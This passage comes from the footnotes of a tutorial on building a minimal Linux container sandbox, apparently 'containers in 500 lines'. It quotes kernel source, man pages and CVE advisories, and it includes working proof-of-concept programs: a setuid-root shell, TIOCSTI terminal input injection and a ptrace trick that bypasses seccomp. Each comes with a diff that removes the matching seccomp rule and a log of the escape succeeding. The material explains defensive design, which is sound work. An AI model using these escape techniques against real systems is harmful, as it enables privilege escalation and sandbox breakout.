SYSCALL_DEFINE3(semop, int, semid, struct sembuf __user *, tsops,
		unsigned, nsops)
{
	return sys_semtimedop(semid, tsops, nsops, NULL);
}

```

Listing 94: [`ipc/sem.c:1816@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#1816)
```
SYSCALL_DEFINE4(semtimedop, int, semid, struct sembuf __user *, tsops,
		unsigned, nsops, const struct timespec __user *, timeout)
{
	/* ... */
	ns = current->nsproxy->ipc_ns;

	/* ...
	   allocate some space for things.
	   ...
	*/

	sma = sem_obtain_object_check(ns, semid);

	/* ... */
}

```

`msgsnd` and `msgrcv` immediately call `do_msgsnd` and `do_msgrcv`,
which are also listed above:

Listing 95: [`ipc/msg.c:743@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n743)
```
SYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,
		int, msgflg)
{
	long mtype;

	if (get_user(mtype, &msgp->mtype))
		return -EFAULT;
	return do_msgsnd(msqid, mtype, msgp->mtext, msgsz, msgflg);
}

```

Listing 96: [`ipc/msg.c:1004@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1004)
```
SYSCALL_DEFINE5(msgrcv, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,
		long, msgtyp, int, msgflg)
{
	return do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);
}

```

[39](#fnr.39)

We can see that they're effectively namespaced:

Listing 97: `enumerate_net_devs.c`
```
/* Local Variables: */
/* compile-command: "gcc -Wall -Werror -static enumerate_net_devs.c \*/
/*                   -o enumerate_net_devs" */
/* End: */
#include <stdio.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

int main (int argc, char **argv)
{
	int sock = socket(PF_LOCAL, SOCK_SEQPACKET, 0);
	for (size_t i = 0; i < 100; i++) {
		struct ifreq req = { .ifr_ifindex = i };
		if (!ioctl(sock, SIOCGIFNAME, &req))
			printf("%3lu: %s\n", i, req.ifr_name);
	}
	return 0;
}

```
```

[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./enumerate_net_devs
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.7npCN7...done.
=> trying a user namespace...writing /proc/1750/uid_map...writing
/proc/1750/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.  1: lo
=> cleaning cgroups...done.

```

[40](#fnr.40)

Network device datastructures are created inside of the kernel, not in
userspace with `mknod`.

For example, `ip link add dummy0 type dummy` does this:

* Opens a `NETLINK_ROUTE` netlink socket.
* Sends a `RTM_NEWLINK` message over it.
* Code in [`net/core/rtnetlink.c@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/rtnetlink.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3) dispatches the message to
  `rtnl_create_link`, which does this;

  Listing 98: [`net/core/rtnetlink.c:2239@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/rtnetlink.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n2239)
  ```
  struct net_device *rtnl_create_link(struct net *net,
  	const char *ifname, unsigned char name_assign_type,
  	const struct rtnl_link_ops *ops, struct nlattr *tb[])
  {
  	int err;
  	struct net_device *dev;
  	unsigned int num_tx_queues = 1;
  	unsigned int num_rx_queues = 1;

  	/* ... */

  	err = -ENOMEM;
  	dev = alloc_netdev_mqs(ops->priv_size, ifname, name_assign_type,
  			       ops->setup, num_tx_queues, num_rx_queues);
  	if (!dev)
  		goto err;

  	/* ... */
  }

  ```
* `alloc_netdev_mqs` calls the `setup` function:

  ```
  /**
   *	alloc_netdev_mqs - allocate network device
   *	@sizeof_priv:		size of private data to allocate space for
   *	@name:			device name format string
   *	@name_assign_type:	origin of device name
   *	@setup:			callback to initialize device
   *	@txqs:			the number of TX subqueues to allocate
   *	@rxqs:			the number of RX subqueues to allocate
   *
   *	Allocates a struct net_device with private data area for driver use
   *	and performs basic initialization.  Also allocates subqueue structs
   *	for each queue on the device.
   */
  struct net_device *alloc_netdev_mqs(int sizeof_priv, const char *name,
  		unsigned char name_assign_type,
  		void (*setup)(struct net_device *),
  		unsigned int txqs, unsigned int rxqs)
  {
  	struct net_device *dev;
  	size_t alloc_size;
  	struct net_device *p;

  	/* ... */

  	setup(dev);

  	/* ... */
  }

  ```
* `dummy_setup` gets called, since it's the `.setup` of a
  `rtnl_link_ops`:

  Listing 100: [`drivers/net/dummy.c:170@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/drivers/net/dummy.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n170)
  ```
  static struct rtnl_link_ops dummy_link_ops __read_mostly = {
  	.kind		= DRV_NAME,
  	.setup		= dummy_setup,
  	.validate	= dummy_validate,
  };

  ```

  Listing 101: [`drivers/net/dummy.c:137@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/drivers/net/dummy.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n137)
  ```
  static void dummy_setup(struct net_device *dev)
  {
  	ether_setup(dev);

  	/* Initialize the device structure. */
  	dev->netdev_ops = &dummy_netdev_ops;
  	dev->ethtool_ops = &dummy_ethtool_ops;
  	dev->destructor = free_netdev;

  	/* Fill in device structure with ethernet-generic values. */
  	dev->flags |= IFF_NOARP;
  	dev->flags &= ~IFF_MULTICAST;
  	dev->priv_flags |= IFF_LIVE_ADDR_CHANGE | IFF_NO_QUEUE;
  	dev->features	|= NETIF_F_SG | NETIF_F_FRAGLIST;
  	dev->features	|= NETIF_F_ALL_TSO | NETIF_F_UFO;
  	dev->features	|= NETIF_F_HW_CSUM | NETIF_F_HIGHDMA | NETIF_F_LLTX;
  	dev->features	|= NETIF_F_GSO_ENCAP_ALL;
  	dev->hw_features |= dev->features;
  	dev->hw_enc_features |= dev->features;
  	eth_hw_addr_random(dev);
  }

  ```

In other words, there's no equivalent of userspace major / minor
device numbers for network devices.

[41](#fnr.41)
Listing 102: [`kernel/ptrace.c:1079@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/ptrace.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1079):
```
SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,
		unsigned long, data)
{
	struct task_struct *child;
	long ret;

	if (request == PTRACE_TRACEME) {
		ret = ptrace_traceme();
		if (!ret)
			arch_ptrace_attach(current);
		goto out;
	}

	child = ptrace_get_task_struct(pid);
	if (IS_ERR(child)) {
		ret = PTR_ERR(child);
		goto out;
	}
	[...]
}

```

which calls `ptrace_get_task_struct`:

Listing 103: [`kernel/ptrace.c:1060@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/ptrace.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1060):
```
static struct task_struct *ptrace_get_task_struct(pid_t pid)
{
	struct task_struct *child;

	rcu_read_lock();
	child = find_task_by_vpid(pid);
	if (child)
		get_task_struct(child);
	rcu_read_unlock();

	if (!child)
		return ERR_PTR(-ESRCH);
	return child;
}

```

…which in turn calls `find_task_by_vpid`

Listing 104: [`kernel/pid.c:459@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n459):
```
struct task_struct *find_task_by_vpid(pid_t vnr)
{
	return find_task_by_pid_ns(vnr, task_active_pid_ns(current));
}

```

which calls `find_task_by_pid_ns`:

Listing 105: [`kernel/pid.c:452@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n452):
```
struct task_struct *find_task_by_pid_ns(pid_t nr, struct pid_namespace *ns)
{
	RCU_LOCKDEP_WARN(!rcu_read_lock_held(),
			 "find_task_by_pid_ns() needs rcu_read_lock() protection");
	return pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);
}

```

which, finally, calls `find_pid_ns`. You can see here that it only
finds a `stuct pid *` that shares the pid namespace of the current task.

Listing 106: [`kernel/pid.c:366@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n366):
```
struct pid *find_pid_ns(int nr, struct pid_namespace *ns)
{
	struct upid *pnr;

	hlist_for_each_entry_rcu(pnr,
			&pid_hash[pid_hashfn(nr, ns)], pid_chain)
		if (pnr->nr == nr && pnr->ns == ns)
			return container_of(pnr, struct pid,
					numbers[ns->level]);

	return NULL;
}

```

[42](#fnr.42)

The `kill` syscalls call `kill_something_info`, which follows a dense
call chain ( `kill_pid_info` -> `group_send_sig_info` ->
`do_send_sig_info` -> `send_sig_info` -> `send_signal` ->
`__send_signal`) to eventually end up in `__send_signal`, which does
respect user namespaces:

Listing 107: [`kernel/signal.c:972@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/signal.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n972)
```
static int __send_signal(int sig, struct siginfo *info, struct task_struct *t,
			int group, int from_ancestor_ns)
{
	/* ... */
	q = __sigqueue_alloc(sig, t, GFP_ATOMIC | __GFP_NOTRACK_FALSE_POSITIVE,
		override_rlimit);
	if (q) {
		list_add_tail(&q->list, &pending->list);
		switch ((unsigned long) info) {
		case (unsigned long) SEND_SIG_NOINFO:
			q->info.si_signo = sig;
			q->info.si_errno = 0;
			q->info.si_code = SI_USER;
			q->info.si_pid = task_tgid_nr_ns(current,
							task_active_pid_ns(t));
			q->info.si_uid = from_kuid_munged(current_user_ns(), current_uid());
			break;
		case (unsigned long) SEND_SIG_PRIV:
			q->info.si_signo = sig;
			q->info.si_errno = 0;
			q->info.si_code = SI_KERNEL;
			q->info.si_pid = 0;
			q->info.si_uid = 0;
			break;
		default:
			copy_siginfo(&q->info, info);
			if (from_ancestor_ns)
				q->info.si_pid = 0;
			break;
		}

		userns_fixup_signal_uid(&q->info, t);
	}
	/*...*/
}

```

[43](#fnr.43)

Quoted [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html), again:

```
	CAP_SETGID
		Make  arbitrary  manipulations   of  process  GIDs  and
		supplementary GID  list; forge GID when  passing socket
		credentials via  UNIX domain sockets; write  a group ID
		mapping in a user namespace (see user_namespaces(7)).
	CAP_SETUID
		Make   arbitrary   manipulations    of   process   UIDs
		(setuid(2),  setreuid(2),  setresuid(2),  setfsuid(2));
		forge  UID when  passing  socket  credentials via  UNIX
		domain  sockets; write  a  user ID  mapping  in a  user
		namespace (see user_namespaces(7)).

```

[44](#fnr.44)

[Brad Spengler's "False Boundaries and Arbitrary Code Execution"](https://forums.grsecurity.net/viewtopic.php?f%3D7&t%3D2522), again

> CAP\_SYS\_CHROOT: generic: From Julien Tinnes/Chris Evans: if you
> have write access to the same filesystem as a suid root binary,
> set up a chroot environment with a backdoored libc and then
> execute a hardlinked suid root binary within your chroot and gain
> full root privileges through your backdoor

[45](#fnr.45)

[`man 2 chroot`](http://man7.org/linux/man-pages/man2/chroot.2.html):

> This call does not change the current working directory, so that
> after the call '.' can be outside the tree rooted at '/'. In
> particular, the superuser can escape from a "chroot jail" by doing:
>
> ```
>
> mkdir foo; chroot foo; cd ..
>
> ```

[46](#fnr.46)

There have been issues with unpacking containers in Docker and LXC:

Listing 110: [`Docker 1.3.2 - Security Advisory {24 Nov 2014}`](http://www.openwall.com/lists/oss-security/2014/11/24/5)
```
=====================================================
[CVE-2014-6407] Archive extraction allowing host privilege escalation
=====================================================
Severity: Critical
Affects: Docker up to 1.3.1

The Docker engine, up to and including version 1.3.1, was vulnerable to
extracting files to arbitrary paths on the host during âdocker pullâ and
âdocker loadâ operations. This was caused by symlink and hardlink
traversals present in Docker's image extraction. This vulnerability could
be leveraged to perform remote code execution and privilege escalation.

```

Listing 111: [`Docker 1.6.1 - Security Advisory {150507}`](http://www.openwall.com/lists/oss-security/2015/05/07/10)
```
====================================================================

[CVE-2015-3629] Symlink traversal on container respawn allows local
privilege escalation

====================================================================

Libcontainer version 1.6.0 introduced changes which facilitated a mount
namespace breakout upon respawn of a container. This allowed malicious
images to write files to the host system and escape containerization.

```

Listing 112: [`Security issues in LXC (CVE-2015-1331 and CVE-2015-1334)`](http://www.openwall.com/lists/oss-security/2015/07/22/4), from Tyler Hicks
```
* Roman Fiedler discovered a directory traversal flaw that allows
  arbitrary file creation as the root user. A local attacker must set up
  a symlink at /run/lock/lxc/var/lib/lxc/<CONTAINER>, prior to an admin
  ever creating an LXC container on the system. If an admin then creates
  a container with a name matching <CONTAINER>, the symlink will be
  followed and LXC will create an empty file at the symlink's target as
  the root user.
  - CVE-2015-1331
  - Affects LXC 1.0.0 and higher
  - https://launchpad.net/bugs/1470842
  - https://github.com/lxc/lxc/commit/72cf81f6a3404e35028567db2c99a90406e9c6e6 (master)
  - https://github.com/lxc/lxc/commit/61ecf69d7834921cc078e14d1b36c459ad8f91c7 (stable-1.1)
  - https://github.com/lxc/lxc/commit/f547349ea7ef3a6eae6965a95cb5986cd921bd99 (stable-1.0)

* Roman Fiedler discovered a flaw that allows processes intended to be
  run inside of confined LXC containers to escape their AppArmor or
  SELinux confinement. A malicious container can create a fake proc
  filesystem, possibly by mounting tmpfs on top of the container's
  /proc, and wait for a lxc-attach to be ran from the host environment.
  lxc-attach incorrectly trusts the container's
  /proc/PID/attr/{current,exec} files to set up the AppArmor profile and
  SELinux domain transitions which may result in no confinement being
  used.
  - CVE-2015-1334
  - Affects LXC 0.9.0 and higher
  - https://launchpad.net/bugs/1475050
  - https://github.com/lxc/lxc/commit/5c3fcae78b63ac9dd56e36075903921bd9461f9e (master)
  - https://github.com/lxc/lxc/commit/659e807c8dd1525a5c94bdecc47599079fad8407 (stable-1.1)
  - https://github.com/lxc/lxc/commit/15ec0fd9d490dd5c8a153401360233c6ee947c24 (stable-1.0)

Tyler

```

These are all really interesting! I want to write more about them.

[47](#fnr.47)

The Docker seccomp policy doesn't include an explicit blacklist, which makes
it a little hard to follow, so I wrote code to find it.

```
    #!/usr/bin/env python3

    import gzip
    import requests
    import re
    import sys

    url = "https://raw.githubusercontent.com/docker/docker/5ff21add06ce0e502b41a194077daad311901996/profiles/seccomp/default.json"

    conditional = set()
    allowed = set()
    disallowed = set()

    for entry in requests.get(url).json()["syscalls"]:
        if entry["args"]:
           conditional |= set(entry["names"])
        else:
            allowed |= set(entry["names"])

    manpage = "/usr/share/man/man2/syscalls.2.gz"

    with gzip.open(manpage, "r") as f:
        ready = False
        for _line in f:
            line = _line.decode("utf-8")
            # table end
            if ready and line == ".TE\n":
                break
            match = re.match(r"\\fB(.+?)\\fP(.+)", line)
            if match:
                if match.group(1) == "System call":
                    ready = True
                elif (match.group(1) not in allowed
                      and match.group(1) not in conditional):
                    disallowed.add(match.group(1))

    print("Conditionally allowed:")
    for c in sorted(conditional):
        sys.stdout.write("~%s~, " % c)
    print("\n\nDisallowed:")
    for d in sorted(disallowed):
        sys.stdout.write("~%s~, " % d)
    sys.stdout.write("\n")

```

Conditionally allowed:
`clone`, `personality`,

Disallowed: `_sysctl`, `add_key`, `alloc_hugepages`, `bdflush`,
`clock_adjtime`, `clock_settime`, `create_module`, `free_hugepages`,
`get_kernel_syms`, `get_mempolicy`, `getpagesize`, `kern_features`,
`kexec_file_load`, `kexec_load`, `keyctl`, `mbind`, `migrate_pages`,
`move_pages`, `nfsservctl`, `nice`, `oldfstat`, `oldlstat`,
`oldolduname`, `oldstat`, `olduname`, `pciconfig_iobase`,
`pciconfig_read`, `pciconfig_write`, `perfctr`, `perfmonctl`,
`pivot_root`, `ppc_rtas`, `preadv2`, `pwritev2`, `quotactl`,
`readdir`, `request_key`, `set_mempolicy`, `setup`, `sgetmask`,
`sigaction`, `signal`, `sigpending`, `sigprocmask`, `sigsuspend`,
`spu_create`, `spu_run`, `ssetmask`, `subpage_prot`, `swapoff`,
`swapon`, `sync_file_range2`, `sysfs`, `uselib`, `userfaultfd`,
`ustat`, `utrap_install`, `vm86`, `vm86old`

[48](#fnr.48)
Listing 114: `self_setuid.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static self_setuid.c -o self_setuid" -*- */
#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

int main (int argc, char **argv)
{
	if (argc == 2 && !strcmp(argv[1], "shell")) {
		if (setresuid(0, 0, 0)) {
			fprintf(stderr, "++ setresuid(0, 0, 0) failed: %m\n");
			return 1;
		}
		return system("sh");
	} else {
		if (chown(argv[0], 0, 0)) {
			fprintf(stderr, "++ chown failed: %m\n");
			return 1;
		}
		int self_fd = 0;
		if (!(self_fd = open(argv[0], 0))) {
			fprintf(stderr, "++ fopen failed: %m\n");
			return 1;
		}
		if (chmod(argv[0], S_ISUID | S_IXOTH)
		    && fchmod(self_fd, S_ISUID | S_IXOTH)
		    && fchmodat(AT_FDCWD, argv[0], S_ISUID | S_IXOTH, 0)) {
			fprintf(stderr, "++ chmod  / fchmod / fchmodat failed: %m\n");
			close(self_fd);
			return 1;
		}
		close(self_fd);
		return 0;
	}
}

```

Listing 115: `allow_chmod.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..b471a69 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -151,18 +151,6 @@ int syscalls()
 	scmp_filter_ctx ctx = NULL;
 	fprintf(stderr, "=> filtering syscalls...");
 	if (!(ctx = seccomp_init(SCMP_ACT_ALLOW))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(chmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmod), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
-				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISUID, S_ISUID))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(fchmodat), 1,
-				SCMP_A2(SCMP_CMP_MASKED_EQ, S_ISGID, S_ISGID))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(unshare), 1,
 				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,

```
```

[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./self_setuid
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.EXwjdL...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.  ++ chmod / fchmod / fchmodat failed:
Operation not permitted
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$sudo ./contained.allow_chmod -m . -u 0 -c ./self_setuid
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.35HO0W...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$./self_setuid shell
sh-4.3#whoami
root
sh-4.3# exit
[lizzie@empress l-c-i-500-l]$rm ./self_setuid

```

[49](#fnr.49)

I heard about this pretty recently because of CVE-2016-7545, an
SELinux bug:

Listing 118: [`CVE-2016-7545 -- SELinux sandbox escape`](http://www.openwall.com/lists/oss-security/2016/09/25/1) from Federico Bento
```
Hi,

When executing a program via the SELinux sandbox, the nonpriv session
can escape to the parent session by using the TIOCSTI ioctl to push
characters into the terminal's input buffer, allowing an attacker to
escape the sandbox.

$ cat test.c
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
     char *cmd = "id\n";
     while(*cmd)
      ioctl(0, TIOCSTI, cmd++);
     execlp("/bin/id", "id", NULL);
}

$ gcc test.c -o test
$ /bin/sandbox ./test
id
uid=1000 gid=1000 groups=1000
context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
$ id    <------ did not type this
uid=1000(saken) gid=1000(saken) groups=1000(saken)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Bug report:
https://bugzilla.redhat.com/show_bug.cgi?id=1378577

Upstream fix:
https://marc.info/?l=selinux&m=147465160112766&w=2
https://marc.info/?l=selinux&m=147466045909969&w=2
https://github.com/SELinuxProject/selinux/commit/acca96a135a4d2a028ba9b636886af99c0915379

Federico Bento.

```

Listing 119: `tiocsti.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static tiocsti.c -o tiocsti" -*- */
/* adapted from http://www.openwall.com/lists/oss-security/2016/09/25/1 */
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>

int main()
{
     for (char *cmd = "id\n"; *cmd; cmd++) {
	     if (ioctl(STDIN_FILENO, TIOCSTI, cmd)) {
		     fprintf(stderr, "++ ioctl failed: %m\n");
		     return 1;
	     }
     }
     return 0;
}

```

Listing 120: `allow_tiocsti.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..5fb25bd 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -167,8 +167,6 @@ int syscalls()
 				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,
 				SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ioctl), 1,
-				SCMP_A1(SCMP_CMP_MASKED_EQ, TIOCSTI, TIOCSTI))
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c ./tiocsti
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.P5QATt...done.
=> trying a user namespace...writing /proc/1819/uid_map...writing
/proc/1819/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.  ++ ioctl failed: Operation not
permitted
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_tiocsti -m . -u 0 -c ./tiocsti
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.J9mulv...done.
=> trying a user namespace...writing /proc/1865/uid_map...writing
/proc/1865/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
id
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ uid=1000(lizzie) gid=1000(lizzie) groups=1000(lizzie)

```

[50](#fnr.50)

There's a notion of "user keyrings", that I believe are
user-namespaced, but that's it.

Listing 122: [`man 7 keyrings`](http://man7.org/linux/man-pages/man7/keyrings.7.html)
```
	User keyrings
		Each UID known to the kernel has a record that contains
		two  keyrings: The  user keyring  and the  user session
		keyring.  These exist for as  long as the UID record in
		the  kernel exists.   A  link to  the  user keyring  is
		placed in a  new session keyring by  pam_keyinit when a
		new login session is initiated.

```

[51](#fnr.51)

[`man 2 seccomp`](http://man7.org/linux/man-pages/man2/seccomp.2.html) says:

> The seccomp check will not be run again after the tracer is
> notified. (This means that seccomp-based sandboxes must not allow
> use of ptrace(2)–even of other sandboxed processes–without extreme
> care; ptracers can use this mechanism to escape from the seccomp
> sandbox.)

Here's an example (remember that our seccomp profile should prevent
`chmod(x, I_SUID)`:

Listing 124: `ptrace_breaks_seccomp.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static ptrace_breaks_seccomp.c -o ptrace_breaks_seccomp" -*- */
#include <sys/stat.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stddef.h>
#include <sys/syscall.h>

#define MAGIC_SYSCALL 666

int main (int argc, char **argv)
{
	pid_t child = 0;
	switch ((child = fork())) {
	case -1:
		fprintf(stderr, "++ fork failed: %m\n");
		return 1;
	case 0:;
		fprintf(stderr, "++ child stopping itself.\n");
		if (kill(getpid(), SIGSTOP)) {
			fprintf(stderr, "++ kill failed: %m\n");
			return 1;
		}
		fprintf(stderr, "++ child continued\n");
		/* pick an arbitrary syscall number. our tracer will change it to chmod. */
		if (syscall(MAGIC_SYSCALL, argv[0], S_ISUID | S_IRUSR | S_IWUSR | S_IXUSR)) {
			fprintf(stderr, "chmod-via-nanosleep failed: %m\n");
			return 1;
		}
		fprintf(stderr, "++ chmod succeeded, child finished.\n");
		break;
	default:;
		int status = 0;
		if (ptrace(PTRACE_ATTACH,child, NULL, NULL)) {
			fprintf(stderr, "++ ptrace failed: %m\n");
			return 1;
		}
		waitpid(child, &status, 0);
		if (!(status & SIGSTOP)) {
			fprintf(stderr, "++ expected SIGSTOP in child.\n");
			return 1;
		}
		struct user_regs_struct regs = {0};
		while (1) {
			if (ptrace(PTRACE_GETREGS, child, 0, &regs)) {
				fprintf(stderr, "++ getting child registers failed: %m\n");
				return 1;
			}
			if (!(regs.orig_rax == MAGIC_SYSCALL)) {
				if (ptrace(PTRACE_SYSCALL, child, 0, 0)) {
					fprintf(stderr, "++ continuing the process failed.\n");
					return 1;
				}
				waitpid(child, &status, 0);
				if (!(status & SIGTRAP)) {
					fprintf(stderr, "++ expected SIGTRAP in child.\n");
					return 1;
				}
			} else {
				fprintf(stderr, "++ got MAGIC_SYSCALL!\n");
				regs.orig_rax = SYS_chmod;
				if (ptrace(PTRACE_SETREGS, child, 0, &regs)) {
					fprintf(stderr, "++ continuing child failed: %m\n");
					return 1;
				}
				if (ptrace(PTRACE_CONT, child, 0, 0)) {
					fprintf(stderr, "++ continuing child failed: %m\n");
					return 1;
				}
				break;
			}
		}
		waitpid(child, NULL, 0);
		fprintf(stderr, "++ finished waiting.\n");

		break;
	}
	return 0;
}

```

Listing 125: `allow_ptrace.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 2291ecb..42ecbc6 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -173,7 +173,6 @@ int syscalls()
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)
-	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ptrace), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(mbind), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(migrate_pages), 0)
 	    || seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(move_pages), 0)

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c ./ptrace_breaks_seccomp
=> validating Linux version...4.7.6-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> remounting everything with MS_PRIVATE...remounted.
